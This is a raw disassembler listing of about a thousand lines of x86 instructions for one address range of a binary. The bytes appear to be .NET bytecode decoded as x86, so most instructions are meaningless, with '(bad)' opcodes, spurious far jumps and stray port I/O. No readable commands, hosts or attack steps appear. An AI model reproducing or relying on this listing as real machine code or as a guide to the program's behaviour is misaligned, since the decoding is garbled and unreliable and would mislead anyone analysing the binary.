  40471a:	1d 00 70 72 9d       	sbb    $0x9d727000,%eax
  40471f:	1d 00 70 d0 14       	sbb    $0x14d07000,%eax
  404724:	00 00                	add    %al,(%eax)
  404726:	02 28                	add    (%eax),%ch
  404728:	62 00                	bound  %eax,(%eax)
  40472a:	00 0a                	add    %cl,(%edx)
  40472c:	12 00                	adc    (%eax),%al
  40472e:	28 55 00             	sub    %dl,0x0(%ebp)
  404731:	00 06                	add    %al,(%esi)
  404733:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404734:	12 00                	adc    (%eax),%al
  404736:	00 02                	add    %al,(%edx)
  404738:	39 02                	cmp    %eax,(%edx)
  40473a:	00 00                	add    %al,(%eax)
  40473c:	00 16                	add    %dl,(%esi)
  40473e:	2a 0e                	sub    (%esi),%cl
  404740:	04 06                	add    $0x6,%al
  404742:	1a 9a a5 85 00 00    	sbb    0x85a5(%edx),%bl
  404748:	01 54 17 2a          	add    %edx,0x2a(%edi,%edx,1)
  40474c:	1b 30                	sbb    (%eax),%esi
  40474e:	04 00                	add    $0x0,%al
  404750:	f5                   	cmc
  404751:	01 00                	add    %eax,(%eax)
  404753:	00 17                	add    %dl,(%edi)
  404755:	00 00                	add    %al,(%eax)
  404757:	11 7e ad             	adc    %edi,-0x53(%esi)
  40475a:	00 00                	add    %al,(%eax)
  40475c:	0a 0a                	or     (%edx),%cl
  40475e:	0f 00 28             	verw   (%eax)
  404761:	ea 00 00 0a 1f 3c 6a 	ljmp   $0x6a3c,$0x1f0a0000
  404768:	58                   	pop    %eax
  404769:	28 eb                	sub    %ch,%bl
  40476b:	00 00                	add    %al,(%eax)
  40476d:	0a 28                	or     (%eax),%ch
  40476f:	ec                   	in     (%dx),%al
  404770:	00 00                	add    %al,(%eax)
  404772:	0a 0b                	or     (%ebx),%cl
  404774:	0f 00 28             	verw   (%eax)
  404777:	ea 00 00 0a 07 6a 58 	ljmp   $0x586a,$0x70a0000
  40477e:	1f                   	pop    %ds
  40477f:	14 6a                	adc    $0x6a,%al
  404781:	58                   	pop    %eax
  404782:	28 eb                	sub    %ch,%bl
  404784:	00 00                	add    %al,(%eax)
  404786:	0a 28                	or     (%eax),%ch
  404788:	ed                   	in     (%dx),%eax
  404789:	00 00                	add    %al,(%eax)
  40478b:	0a 26                	or     (%esi),%ah
  40478d:	0f 00 28             	verw   (%eax)
  404790:	ea 00 00 0a 07 6a 58 	ljmp   $0x586a,$0x70a0000
  404797:	1f                   	pop    %ds
  404798:	18 6a 58             	sbb    %ch,0x58(%edx)
  40479b:	0c 08                	or     $0x8,%al
  40479d:	28 eb                	sub    %ch,%bl
  40479f:	00 00                	add    %al,(%eax)
  4047a1:	0a 28                	or     (%eax),%ch
  4047a3:	ed                   	in     (%dx),%eax
  4047a4:	00 00                	add    %al,(%eax)
  4047a6:	0a 16                	or     (%esi),%dl
  4047a8:	6a 0d                	push   $0xd
  4047aa:	20 0b                	and    %cl,(%ebx)
  4047ac:	01 00                	add    %eax,(%eax)
  4047ae:	00 40 0b             	add    %al,0xb(%eax)
  4047b1:	00 00                	add    %al,(%eax)
  4047b3:	00 08                	add    %cl,(%eax)
  4047b5:	1f                   	pop    %ds
  4047b6:	60                   	pusha
  4047b7:	6a 58                	push   $0x58
  4047b9:	0d 38 06 00 00       	or     $0x638,%eax
  4047be:	00 08                	add    %cl,(%eax)
  4047c0:	1f                   	pop    %ds
  4047c1:	70 6a                	jo     0x40482d
  4047c3:	58                   	pop    %eax
  4047c4:	0d 09 28 eb 00       	or     $0xeb2809,%eax
  4047c9:	00 0a                	add    %cl,(%edx)
  4047cb:	28 ec                	sub    %ch,%ah
  4047cd:	00 00                	add    %al,(%eax)
  4047cf:	0a 13                	or     (%ebx),%dl
  4047d1:	04 0f                	add    $0xf,%al
  4047d3:	00 28                	add    %ch,(%eax)
  4047d5:	ea 00 00 0a 11 04 6a 	ljmp   $0x6a04,$0x110a0000
  4047dc:	58                   	pop    %eax
  4047dd:	1f                   	pop    %ds
  4047de:	10 6a 58             	adc    %ch,0x58(%edx)
  4047e1:	28 eb                	sub    %ch,%bl
  4047e3:	00 00                	add    %al,(%eax)
  4047e5:	0a 28                	or     (%eax),%ch
  4047e7:	ec                   	in     (%dx),%al
  4047e8:	00 00                	add    %al,(%eax)
  4047ea:	0a 13                	or     (%ebx),%dl
  4047ec:	05 0f 00 28 ea       	add    $0xea28000f,%eax
  4047f1:	00 00                	add    %al,(%eax)
  4047f3:	0a 11                	or     (%ecx),%dl
  4047f5:	04 6a                	add    $0x6a,%al
  4047f7:	58                   	pop    %eax
  4047f8:	1f                   	pop    %ds
  4047f9:	14 6a                	adc    $0x6a,%al
  4047fb:	58                   	pop    %eax
  4047fc:	28 eb                	sub    %ch,%bl
  4047fe:	00 00                	add    %al,(%eax)
  404800:	0a 28                	or     (%eax),%ch
  404802:	ec                   	in     (%dx),%al
  404803:	00 00                	add    %al,(%eax)
  404805:	0a 26                	or     (%esi),%ah
  404807:	0f 00 28             	verw   (%eax)
  40480a:	ea 00 00 0a 11 04 6a 	ljmp   $0x6a04,$0x110a0000
  404811:	58                   	pop    %eax
  404812:	1f                   	pop    %ds
  404813:	18 6a 58             	sbb    %ch,0x58(%edx)
  404816:	28 eb                	sub    %ch,%bl
  404818:	00 00                	add    %al,(%eax)
  40481a:	0a 28                	or     (%eax),%ch
  40481c:	ec                   	in     (%dx),%al
  40481d:	00 00                	add    %al,(%eax)
  40481f:	0a 13                	or     (%ebx),%dl
  404821:	06                   	push   %es
  404822:	0f 00 28             	verw   (%eax)
  404825:	ea 00 00 0a 11 04 6a 	ljmp   $0x6a04,$0x110a0000
  40482c:	58                   	pop    %eax
  40482d:	1f                   	pop    %ds
  40482e:	1c 6a                	sbb    $0x6a,%al
  404830:	58                   	pop    %eax
  404831:	28 eb                	sub    %ch,%bl
  404833:	00 00                	add    %al,(%eax)
  404835:	0a 28                	or     (%eax),%ch
  404837:	ec                   	in     (%dx),%al
  404838:	00 00                	add    %al,(%eax)
  40483a:	0a 13                	or     (%ebx),%dl
  40483c:	07                   	pop    %es
  40483d:	0f 00 28             	verw   (%eax)
  404840:	ea 00 00 0a 11 04 6a 	ljmp   $0x6a04,$0x110a0000
  404847:	58                   	pop    %eax
  404848:	1f                   	pop    %ds
  404849:	20 6a 58             	and    %ch,0x58(%edx)
  40484c:	28 eb                	sub    %ch,%bl
  40484e:	00 00                	add    %al,(%eax)
  404850:	0a 28                	or     (%eax),%ch
  404852:	ec                   	in     (%dx),%al
  404853:	00 00                	add    %al,(%eax)
  404855:	0a 13                	or     (%ebx),%dl
  404857:	08 0f                	or     %cl,(%edi)
  404859:	00 28                	add    %ch,(%eax)
  40485b:	ea 00 00 0a 11 04 6a 	ljmp   $0x6a04,$0x110a0000
  404862:	58                   	pop    %eax
  404863:	1f                   	pop    %ds
  404864:	24 6a                	and    $0x6a,%al
  404866:	58                   	pop    %eax
  404867:	28 eb                	sub    %ch,%bl
  404869:	00 00                	add    %al,(%eax)
  40486b:	0a 28                	or     (%eax),%ch
  40486d:	ec                   	in     (%dx),%al
  40486e:	00 00                	add    %al,(%eax)
  404870:	0a 13                	or     (%ebx),%dl
  404872:	09 16                	or     %edx,(%esi)
  404874:	13 0a                	adc    (%edx),%ecx
  404876:	38 95 00 00 00 0f    	cmp    %dl,0xf000000(%ebp)
  40487c:	00 28                	add    %ch,(%eax)
  40487e:	ea 00 00 0a 0f 00 28 	ljmp   $0x2800,$0xf0a0000
  404885:	ea 00 00 0a 11 08 6a 	ljmp   $0x6a08,$0x110a0000
  40488c:	58                   	pop    %eax
  40488d:	11 0a                	adc    %ecx,(%edx)
  40488f:	1a 5a 6a             	sbb    0x6a(%edx),%bl
  404892:	58                   	pop    %eax
  404893:	28 eb                	sub    %ch,%bl
  404895:	00 00                	add    %al,(%eax)
  404897:	0a 28                	or     (%eax),%ch
  404899:	ec                   	in     (%dx),%al
  40489a:	00 00                	add    %al,(%eax)
  40489c:	0a 6a 58             	or     0x58(%edx),%ch
  40489f:	28 eb                	sub    %ch,%bl
  4048a1:	00 00                	add    %al,(%eax)
  4048a3:	0a 28                	or     (%eax),%ch
  4048a5:	ee                   	out    %al,(%dx)
  4048a6:	00 00                	add    %al,(%eax)
  4048a8:	0a 03                	or     (%ebx),%al
  4048aa:	1b 6f ef             	sbb    -0x11(%edi),%ebp
  4048ad:	00 00                	add    %al,(%eax)
  4048af:	0a 39                	or     (%ecx),%bh
  4048b1:	55                   	push   %ebp
  4048b2:	00 00                	add    %al,(%eax)
  4048b4:	00 0f                	add    %cl,(%edi)
  4048b6:	00 28                	add    %ch,(%eax)
  4048b8:	ea 00 00 0a 11 09 6a 	ljmp   $0x6a09,$0x110a0000
  4048bf:	58                   	pop    %eax
  4048c0:	11 0a                	adc    %ecx,(%edx)
  4048c2:	18 5a 6a             	sbb    %bl,0x6a(%edx)
  4048c5:	58                   	pop    %eax
  4048c6:	28 eb                	sub    %ch,%bl
  4048c8:	00 00                	add    %al,(%eax)
  4048ca:	0a 28                	or     (%eax),%ch
  4048cc:	ed                   	in     (%dx),%eax
  4048cd:	00 00                	add    %al,(%eax)
  4048cf:	0a 11                	or     (%ecx),%dl
  4048d1:	05 58 13 0b 0f       	add    $0xf0b1358,%eax
  4048d6:	00 28                	add    %ch,(%eax)
  4048d8:	ea 00 00 0a 11 07 6a 	ljmp   $0x6a07,$0x110a0000
  4048df:	58                   	pop    %eax
  4048e0:	1a 11                	sbb    (%ecx),%dl
  4048e2:	0b 11                	or     (%ecx),%edx
  4048e4:	05 59 5a 6a 58       	add    $0x586a5a59,%eax
  4048e9:	28 eb                	sub    %ch,%bl
  4048eb:	00 00                	add    %al,(%eax)
  4048ed:	0a 28                	or     (%eax),%ch
  4048ef:	ec                   	in     (%dx),%al
  4048f0:	00 00                	add    %al,(%eax)
  4048f2:	0a 13                	or     (%ebx),%dl
  4048f4:	0c 02                	or     $0x2,%al
  4048f6:	28 f0                	sub    %dh,%al
  4048f8:	00 00                	add    %al,(%eax)
  4048fa:	0a 11                	or     (%ecx),%dl
  4048fc:	0c 6a                	or     $0x6a,%al
  4048fe:	58                   	pop    %eax
  4048ff:	28 eb                	sub    %ch,%bl
  404901:	00 00                	add    %al,(%eax)
  404903:	0a 0a                	or     (%edx),%cl
  404905:	38 0f                	cmp    %cl,(%edi)
  404907:	00 00                	add    %al,(%eax)
  404909:	00 11                	add    %dl,(%ecx)
  40490b:	0a 17                	or     (%edi),%dl
  40490d:	58                   	pop    %eax
  40490e:	13 0a                	adc    (%edx),%ecx
  404910:	11 0a                	adc    %ecx,(%edx)
  404912:	11 06                	adc    %eax,(%esi)
  404914:	3f                   	aas
  404915:	62 ff ff             	(bad) {rz-bad},{%k7}{z}
  404918:	ff                   	lcall  (bad)
  404919:	dd 0c 00             	fisttpll (%eax,%eax,1)
  40491c:	00 00                	add    %al,(%eax)
  40491e:	26 72 cb             	es jb  0x4048ec
  404921:	1c 00                	sbb    $0x0,%al
  404923:	70 73                	jo     0x404998
  404925:	f1                   	int1
  404926:	00 00                	add    %al,(%eax)
  404928:	0a 7a 06             	or     0x6(%edx),%bh
  40492b:	7e ad                	jle    0x4048da
  40492d:	00 00                	add    %al,(%eax)
  40492f:	0a 28                	or     (%eax),%ch
  404931:	e3 00                	jecxz  0x404933
  404933:	00 0a                	add    %cl,(%edx)
  404935:	39 11                	cmp    %edx,(%ecx)
  404937:	00 00                	add    %al,(%eax)
  404939:	00 03                	add    %al,(%ebx)
  40493b:	72 cb                	jb     0x404908
  40493d:	1d 00 70 28 86       	sbb    $0x86287000,%eax
  404942:	00 00                	add    %al,(%eax)
  404944:	0a 73 f2             	or     -0xe(%ebx),%dh
  404947:	00 00                	add    %al,(%eax)
  404949:	0a 7a 06             	or     0x6(%edx),%bh
  40494c:	2a 00                	sub    (%eax),%al
  40494e:	00 00                	add    %al,(%eax)
  404950:	41                   	inc    %ecx
  404951:	1c 00                	sbb    $0x0,%al
  404953:	00 00                	add    %al,(%eax)
  404955:	00 00                	add    %al,(%eax)
  404957:	00 06                	add    %al,(%esi)
  404959:	00 00                	add    %al,(%eax)
  40495b:	00 c0                	add    %al,%al
  40495d:	01 00                	add    %eax,(%eax)
  40495f:	00 c6                	add    %al,%dh
  404961:	01 00                	add    %eax,(%eax)
  404963:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404966:	00 00                	add    %al,(%eax)
  404968:	01 00                	add    %eax,(%eax)
  40496a:	00 01                	add    %al,(%ecx)
  40496c:	1b 30                	sbb    (%eax),%esi
  40496e:	05 00 98 00 00       	add    $0x9800,%eax
  404973:	00 19                	add    %bl,(%ecx)
  404975:	00 00                	add    %al,(%eax)
  404977:	11 73 66             	adc    %esi,0x66(%ebx)
  40497a:	00 00                	add    %al,(%eax)
  40497c:	06                   	push   %es
  40497d:	0a 06                	or     (%esi),%al
  40497f:	03 7d 84             	add    -0x7c(%ebp),%edi
  404982:	01 00                	add    %eax,(%eax)
  404984:	04 15                	add    $0x15,%al
  404986:	73 f5                	jae    0x40497d
  404988:	00 00                	add    %al,(%eax)
  40498a:	0a 28                	or     (%eax),%ch
  40498c:	6d                   	insl   (%dx),%es:(%edi)
  40498d:	00 00                	add    %al,(%eax)
  40498f:	0a 6f e5             	or     -0x1b(%edi),%ch
  404992:	00 00                	add    %al,(%eax)
  404994:	0a 28                	or     (%eax),%ch
  404996:	04 00                	add    $0x0,%al
  404998:	00 2b                	add    %ch,(%ebx)
  40499a:	06                   	push   %es
  40499b:	fe 06                	incb   (%esi)
  40499d:	67 00 00             	add    %al,(%bx,%si)
  4049a0:	06                   	push   %es
  4049a1:	73 f7                	jae    0x40499a
  4049a3:	00 00                	add    %al,(%eax)
  4049a5:	0a 28                	or     (%eax),%ch
  4049a7:	05 00 00 2b 28       	add    $0x282b0000,%eax
  4049ac:	06                   	push   %es
  4049ad:	00 00                	add    %al,(%eax)
  4049af:	2b 6f e9             	sub    -0x17(%edi),%ebp
  4049b2:	00 00                	add    %al,(%eax)
  4049b4:	0a 04 28             	or     (%eax,%ebp,1),%al
  4049b7:	5e                   	pop    %esi
  4049b8:	00 00                	add    %al,(%eax)
  4049ba:	06                   	push   %es
  4049bb:	0b 12                	or     (%edx),%edx
  4049bd:	02 02                	add    (%edx),%al
  4049bf:	8e 69 28             	mov    0x28(%ecx),%gs
  4049c2:	f5                   	cmc
  4049c3:	00 00                	add    %al,(%eax)
  4049c5:	0a 16                	or     (%esi),%dl
  4049c7:	0d 12 01 12 02       	or     $0x2120112,%eax
  4049cc:	1f                   	pop    %ds
  4049cd:	40                   	inc    %eax
  4049ce:	12 03                	adc    (%ebx),%al
  4049d0:	28 57 00             	sub    %dl,0x0(%edi)
  4049d3:	00 06                	add    %al,(%esi)
  4049d5:	26 02 16             	add    %es:(%esi),%dl
  4049d8:	07                   	pop    %es
  4049d9:	02 8e 69 28 fa 00    	add    0xfa2869(%esi),%cl
  4049df:	00 0a                	add    %cl,(%edx)
  4049e1:	dd 29                	(bad) (%ecx)
  4049e3:	00 00                	add    %al,(%eax)
  4049e5:	00 13                	add    %dl,(%ebx)
  4049e7:	04 72                	add    $0x72,%al
  4049e9:	e3 1d                	jecxz  0x404a08
  4049eb:	00 70 11             	add    %dh,0x11(%eax)
  4049ee:	04 6f                	add    $0x6f,%al
  4049f0:	58                   	pop    %eax
  4049f1:	00 00                	add    %al,(%eax)
  4049f3:	0a 28                	or     (%eax),%ch
  4049f5:	fb                   	sti
  4049f6:	00 00                	add    %al,(%eax)
  4049f8:	0a 72 e3             	or     -0x1d(%edx),%dh
  4049fb:	1d 00 70 11 04       	sbb    $0x4117000,%eax
  404a00:	6f                   	outsl  %ds:(%esi),(%dx)
  404a01:	fc                   	cld
  404a02:	00 00                	add    %al,(%eax)
  404a04:	0a 28                	or     (%eax),%ch
  404a06:	fb                   	sti
  404a07:	00 00                	add    %al,(%eax)
  404a09:	0a dd                	or     %ch,%bl
  404a0b:	00 00                	add    %al,(%eax)
  404a0d:	00 00                	add    %al,(%eax)
  404a0f:	2a 01                	sub    (%ecx),%al
  404a11:	10 00                	adc    %al,(%eax)
  404a13:	00 00                	add    %al,(%eax)
  404a15:	00 0d 00 61 6e 00    	add    %cl,0x6e6100
  404a1b:	29 41 00             	sub    %eax,0x0(%ecx)
  404a1e:	00 01                	add    %al,(%ecx)
  404a20:	1b 30                	sbb    (%eax),%esi
  404a22:	03 00                	add    (%eax),%eax
  404a24:	69 00 00 00 1a 00    	imul   $0x1a0000,(%eax),%eax
  404a2a:	00 11                	add    %dl,(%ecx)
  404a2c:	72 f5                	jb     0x404a23
  404a2e:	1d 00 70 28 5f       	sbb    $0x5f287000,%eax
  404a33:	00 00                	add    %al,(%eax)
  404a35:	06                   	push   %es
  404a36:	0a 28                	or     (%eax),%ch
  404a38:	6d                   	insl   (%dx),%es:(%edi)
  404a39:	00 00                	add    %al,(%eax)
  404a3b:	0a 6f e5             	or     -0x1b(%edi),%ch
  404a3e:	00 00                	add    %al,(%eax)
  404a40:	0a 6f e6             	or     -0x1a(%edi),%ch
  404a43:	00 00                	add    %al,(%eax)
  404a45:	0a 0b                	or     (%ebx),%cl
  404a47:	38 27                	cmp    %ah,(%edi)
  404a49:	00 00                	add    %al,(%eax)
  404a4b:	00 07                	add    %al,(%edi)
  404a4d:	6f                   	outsl  %ds:(%esi),(%dx)
  404a4e:	01 00                	add    %eax,(%eax)
  404a50:	00 0a                	add    %cl,(%edx)
  404a52:	74 1b                	je     0x404a6f
  404a54:	00 00                	add    %al,(%eax)
  404a56:	01 6f e7             	add    %ebp,-0x19(%edi)
  404a59:	00 00                	add    %al,(%eax)
  404a5b:	0a 06                	or     (%esi),%al
  404a5d:	28 2b                	sub    %ch,(%ebx)
  404a5f:	00 00                	add    %al,(%eax)
  404a61:	0a 39                	or     (%ecx),%bh
  404a63:	0c 00                	or     $0x0,%al
  404a65:	00 00                	add    %al,(%eax)
  404a67:	02 06                	add    (%esi),%al
  404a69:	72 0f                	jb     0x404a7a
  404a6b:	1e                   	push   %ds
  404a6c:	00 70 28             	add    %dh,0x28(%eax)
  404a6f:	60                   	pusha
  404a70:	00 00                	add    %al,(%eax)
  404a72:	06                   	push   %es
  404a73:	07                   	pop    %es
  404a74:	6f                   	outsl  %ds:(%esi),(%dx)
  404a75:	02 00                	add    (%eax),%al
  404a77:	00 0a                	add    %cl,(%edx)
  404a79:	2d d1 dd 14 00       	sub    $0x14ddd1,%eax
  404a7e:	00 00                	add    %al,(%eax)
  404a80:	07                   	pop    %es
  404a81:	75 40                	jne    0x404ac3
  404a83:	00 00                	add    %al,(%eax)
  404a85:	01 0c 08             	add    %ecx,(%eax,%ecx,1)
  404a88:	39 06                	cmp    %eax,(%esi)
  404a8a:	00 00                	add    %al,(%eax)
  404a8c:	00 08                	add    %cl,(%eax)
  404a8e:	6f                   	outsl  %ds:(%esi),(%dx)
  404a8f:	27                   	daa
  404a90:	00 00                	add    %al,(%eax)
  404a92:	0a dc                	or     %ah,%bl
  404a94:	2a 00                	sub    (%eax),%al
  404a96:	00 00                	add    %al,(%eax)
  404a98:	01 10                	add    %edx,(%eax)
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	02 00                	add    (%eax),%al
  404a9e:	1b 00                	sbb    (%eax),%eax
  404aa0:	39 54 00 14          	cmp    %edx,0x14(%eax,%eax,1)
  404aa4:	00 00                	add    %al,(%eax)
  404aa6:	00 00                	add    %al,(%eax)
  404aa8:	13 30                	adc    (%eax),%esi
  404aaa:	02 00                	add    (%eax),%al
  404aac:	44                   	inc    %esp
  404aad:	00 00                	add    %al,(%eax)
  404aaf:	00 02                	add    %al,(%edx)
  404ab1:	00 00                	add    %al,(%eax)
  404ab3:	11 28                	adc    %ebp,(%eax)
  404ab5:	fd                   	std
  404ab6:	00 00                	add    %al,(%eax)
  404ab8:	0a 1a                	or     (%edx),%bl
  404aba:	40                   	inc    %eax
  404abb:	07                   	pop    %es
  404abc:	00 00                	add    %al,(%eax)
  404abe:	00 16                	add    %dl,(%esi)
  404ac0:	0a 38                	or     (%eax),%bh
  404ac2:	02 00                	add    (%eax),%al
  404ac4:	00 00                	add    %al,(%eax)
  404ac6:	17                   	pop    %ss
  404ac7:	0a 06                	or     (%esi),%al
  404ac9:	39 15 00 00 00 7e    	cmp    %edx,0x7e000000
  404acf:	82 01 00             	addb   $0x0,(%ecx)
  404ad2:	04 28                	add    $0x28,%al
  404ad4:	61                   	popa
  404ad5:	00 00                	add    %al,(%eax)
  404ad7:	06                   	push   %es
  404ad8:	7e 80                	jle    0x404a5a
  404ada:	01 00                	add    %eax,(%eax)
  404adc:	04 28                	add    $0x28,%al
  404ade:	62 00                	bound  %eax,(%eax)
  404ae0:	00 06                	add    %al,(%esi)
  404ae2:	2a 7e 83             	sub    -0x7d(%esi),%bh
  404ae5:	01 00                	add    %eax,(%eax)
  404ae7:	04 28                	add    $0x28,%al
  404ae9:	61                   	popa
  404aea:	00 00                	add    %al,(%eax)
  404aec:	06                   	push   %es
  404aed:	7e 81                	jle    0x404a70
  404aef:	01 00                	add    %eax,(%eax)
  404af1:	04 28                	add    $0x28,%al
  404af3:	62 00                	bound  %eax,(%eax)
  404af5:	00 06                	add    %al,(%esi)
  404af7:	2a 13                	sub    (%ebx),%dl
  404af9:	30 03                	xor    %al,(%ebx)
  404afb:	00 59 00             	add    %bl,0x0(%ecx)
  404afe:	00 00                	add    %al,(%eax)
  404b00:	00 00                	add    %al,(%eax)
  404b02:	00 00                	add    %al,(%eax)
  404b04:	1a 8d 53 00 00 01    	sbb    0x1000053(%ebp),%cl
  404b0a:	25 d0 96 01 00       	and    $0x196d0,%eax
  404b0f:	04 28                	add    $0x28,%al
  404b11:	fe 00                	incb   (%eax)
  404b13:	00 0a                	add    %cl,(%edx)
  404b15:	80 80 01 00 04 1b 8d 	addb   $0x8d,0x1b040001(%eax)
  404b1c:	53                   	push   %ebx
  404b1d:	00 00                	add    %al,(%eax)
  404b1f:	01 25 d0 98 01 00    	add    %esp,0x198d0
  404b25:	04 28                	add    $0x28,%al
  404b27:	fe 00                	incb   (%eax)
  404b29:	00 0a                	add    %cl,(%edx)
  404b2b:	80 81 01 00 04 1c 8d 	addb   $0x8d,0x1c040001(%ecx)
  404b32:	53                   	push   %ebx
  404b33:	00 00                	add    %al,(%eax)
  404b35:	01 25 d0 97 01 00    	add    %esp,0x197d0
  404b3b:	04 28                	add    $0x28,%al
  404b3d:	fe 00                	incb   (%eax)
  404b3f:	00 0a                	add    %cl,(%edx)
  404b41:	80 82 01 00 04 1e 8d 	addb   $0x8d,0x1e040001(%edx)
  404b48:	53                   	push   %ebx
  404b49:	00 00                	add    %al,(%eax)
  404b4b:	01 25 d0 95 01 00    	add    %esp,0x195d0
  404b51:	04 28                	add    $0x28,%al
  404b53:	fe 00                	incb   (%eax)
  404b55:	00 0a                	add    %cl,(%edx)
  404b57:	80 83 01 00 04 2a 00 	addb   $0x0,0x2a040001(%ebx)
  404b5e:	00 00                	add    %al,(%eax)
  404b60:	13 30                	adc    (%eax),%esi
  404b62:	03 00                	add    (%eax),%eax
  404b64:	14 00                	adc    $0x0,%al
  404b66:	00 00                	add    %al,(%eax)
  404b68:	02 00                	add    (%eax),%al
  404b6a:	00 11                	add    %dl,(%ecx)
  404b6c:	16                   	push   %ss
  404b6d:	7e 08                	jle    0x404b77
  404b6f:	00 00                	add    %al,(%eax)
  404b71:	04 12                	add    $0x12,%al
  404b73:	00 73 ff             	add    %dh,-0x1(%ebx)
  404b76:	00 00                	add    %al,(%eax)
  404b78:	0a 80 85 01 00 04    	or     0x4000185(%eax),%al
  404b7e:	06                   	push   %es
  404b7f:	2a 1b                	sub    (%ebx),%bl
  404b81:	30 03                	xor    %al,(%ebx)
  404b83:	00 2a                	add    %ch,(%edx)
  404b85:	00 00                	add    %al,(%eax)
  404b87:	00 00                	add    %al,(%eax)
  404b89:	00 00                	add    %al,(%eax)
  404b8b:	00 14 fe             	add    %dl,(%esi,%edi,8)
  404b8e:	06                   	push   %es
  404b8f:	6e                   	outsb  %ds:(%esi),(%dx)
  404b90:	00 00                	add    %al,(%eax)
  404b92:	06                   	push   %es
  404b93:	73 01                	jae    0x404b96
  404b95:	01 00                	add    %eax,(%eax)
  404b97:	0a 28                	or     (%eax),%ch
  404b99:	02 01                	add    (%ecx),%al
  404b9b:	00 0a                	add    %cl,(%edx)
  404b9d:	28 03                	sub    %al,(%ebx)
  404b9f:	01 00                	add    %eax,(%eax)
  404ba1:	0a 17                	or     (%edi),%dl
  404ba3:	16                   	push   %ss
  404ba4:	16                   	push   %ss
  404ba5:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404ba9:	06                   	push   %es
  404baa:	dd 06                	fldl   (%esi)
  404bac:	00 00                	add    %al,(%eax)
  404bae:	00 26                	add    %ah,(%esi)
  404bb0:	dd 00                	fldl   (%eax)
  404bb2:	00 00                	add    %al,(%eax)
  404bb4:	00 2a                	add    %ch,(%edx)
  404bb6:	00 00                	add    %al,(%eax)
  404bb8:	01 10                	add    %edx,(%eax)
  404bba:	00 00                	add    %al,(%eax)
  404bbc:	00 00                	add    %al,(%eax)
  404bbe:	00 00                	add    %al,(%eax)
  404bc0:	23 23                	and    (%ebx),%esp
  404bc2:	00 06                	add    %al,(%esi)
  404bc4:	01 00                	add    %eax,(%eax)
  404bc6:	00 01                	add    %al,(%ecx)
  404bc8:	1b 30                	sbb    (%eax),%esi
  404bca:	03 00                	add    (%eax),%eax
  404bcc:	1b 00                	sbb    (%eax),%eax
  404bce:	00 00                	add    %al,(%eax)
  404bd0:	00 00                	add    %al,(%eax)
  404bd2:	00 00                	add    %al,(%eax)
  404bd4:	16                   	push   %ss
  404bd5:	16                   	push   %ss
  404bd6:	16                   	push   %ss
  404bd7:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404bdb:	06                   	push   %es
  404bdc:	dd 0d 00 00 00 26    	fisttpll 0x26000000
  404be2:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  404be8:	17                   	pop    %ss
  404be9:	00 00                	add    %al,(%eax)
  404beb:	0a 2b                	or     (%ebx),%ch
  404bed:	f4                   	hlt
  404bee:	2a 00                	sub    (%eax),%al
  404bf0:	01 10                	add    %edx,(%eax)
  404bf2:	00 00                	add    %al,(%eax)
  404bf4:	00 00                	add    %al,(%eax)
  404bf6:	00 00                	add    %al,(%eax)
  404bf8:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  404bfd:	00 00                	add    %al,(%eax)
  404bff:	01 1b                	add    %ebx,(%ebx)
  404c01:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c04:	41                   	inc    %ecx
  404c05:	00 00                	add    %al,(%eax)
  404c07:	00 1b                	add    %bl,(%ebx)
  404c09:	00 00                	add    %al,(%eax)
  404c0b:	11 7e 7d             	adc    %edi,0x7d(%esi)
  404c0e:	00 00                	add    %al,(%eax)
  404c10:	0a 7e 8d             	or     -0x73(%esi),%bh
  404c13:	01 00                	add    %eax,(%eax)
  404c15:	04 18                	add    $0x18,%al
  404c17:	6f                   	outsl  %ds:(%esi),(%dx)
  404c18:	04 01                	add    $0x1,%al
  404c1a:	00 0a                	add    %cl,(%edx)
  404c1c:	0a 06                	or     (%esi),%al
  404c1e:	02 03                	add    (%ebx),%al
  404c20:	19 6f 05             	sbb    %ebp,0x5(%edi)
  404c23:	01 00                	add    %eax,(%eax)
  404c25:	0a 17                	or     (%edi),%dl
  404c27:	0b dd                	or     %ebp,%ebx
  404c29:	1e                   	push   %ds
  404c2a:	00 00                	add    %al,(%eax)
  404c2c:	00 06                	add    %al,(%esi)
  404c2e:	39 06                	cmp    %eax,(%esi)
  404c30:	00 00                	add    %al,(%eax)
  404c32:	00 06                	add    %al,(%esi)
  404c34:	6f                   	outsl  %ds:(%esi),(%dx)
  404c35:	27                   	daa
  404c36:	00 00                	add    %al,(%eax)
  404c38:	0a dc                	or     %ah,%bl
  404c3a:	6f                   	outsl  %ds:(%esi),(%dx)
  404c3b:	58                   	pop    %eax
  404c3c:	00 00                	add    %al,(%eax)
  404c3e:	0a 28                	or     (%eax),%ch
  404c40:	26 00 00             	add    %al,%es:(%eax)
  404c43:	06                   	push   %es
  404c44:	dd 00                	fldl   (%eax)
  404c46:	00 00                	add    %al,(%eax)
  404c48:	00 16                	add    %dl,(%esi)
  404c4a:	2a 07                	sub    (%edi),%al
  404c4c:	2a 00                	sub    (%eax),%al
  404c4e:	00 00                	add    %al,(%eax)
  404c50:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404c53:	00 02                	add    %al,(%edx)
  404c55:	00 11                	add    %dl,(%ecx)
  404c57:	00 10                	add    %dl,(%eax)
  404c59:	21 00                	and    %eax,(%eax)
  404c5b:	0d 00 00 00 00       	or     $0x0,%eax
  404c60:	00 00                	add    %al,(%eax)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  404c68:	41                   	inc    %ecx
  404c69:	00 00                	add    %al,(%eax)
  404c6b:	01 1b                	add    %ebx,(%ebx)
  404c6d:	30 02                	xor    %al,(%edx)
  404c6f:	00 42 00             	add    %al,0x0(%edx)
  404c72:	00 00                	add    %al,(%eax)
  404c74:	1c 00                	sbb    $0x0,%al
  404c76:	00 11                	add    %dl,(%ecx)
  404c78:	7e 7d                	jle    0x404cf7
  404c7a:	00 00                	add    %al,(%eax)
  404c7c:	0a 7e 8d             	or     -0x73(%esi),%bh
  404c7f:	01 00                	add    %eax,(%eax)
  404c81:	04 6f                	add    $0x6f,%al
  404c83:	dd 00                	fldl   (%eax)
  404c85:	00 0a                	add    %cl,(%edx)
  404c87:	0a 06                	or     (%esi),%al
